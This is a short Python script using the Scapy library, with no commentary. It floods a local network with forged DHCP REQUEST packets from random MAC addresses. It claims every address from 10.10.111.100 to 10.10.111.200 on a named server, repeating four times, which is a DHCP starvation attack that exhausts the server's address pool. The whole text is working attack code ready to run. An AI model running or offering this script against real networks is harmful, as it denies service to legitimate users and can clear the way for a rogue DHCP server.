from scapy.all import *
from time import sleep

def main():
	for x in range(0, 4):

		for i in range(101):
			if i == 7: continue
			requested_addr = "10.10.111."+str(100+i)

			pkt = Ether(src=RandMAC(), dst="ff:ff:ff:ff:ff:ff")
			pkt /= IP(src="0.0.0.0", dst="255.255.255.255")
			pkt /= UDP(sport=68, dport=67)
			pkt /= BOOTP(chaddr=RandString(12, "0123456789abcdef"))
			pkt /= DHCP(options=[("message-type", "request"),
				     ("requested_addr", requested_addr),
		 		     ("server_id", "10.10.111.1"), "end"])


			sendp(pkt)
			print requested_addr
			#sleep(0.4) 
			x = x+1



if __name__ == '__main__':
	main()
